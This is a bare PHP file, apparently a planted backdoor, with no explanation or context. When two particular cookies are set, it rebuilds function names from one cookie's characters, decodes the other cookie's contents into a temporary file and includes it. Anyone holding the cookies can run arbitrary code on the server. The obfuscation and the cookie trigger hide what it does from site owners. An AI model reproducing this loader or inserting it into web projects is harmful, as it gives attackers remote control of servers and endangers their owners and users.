<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[18])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 2;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[18][$n];
        if (!$c[18][$n + 1]) {
            if (!$c[18][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 2 + 1;
    }
    $k = $p[4]() . $p[0];
    if (!$p[8]($k)) {
        $n = $p[29]($k, $p[10]);
        $p[9]($n, $p[14] . $p[6]($p[26]($c[3])));
    }
    include($k);
}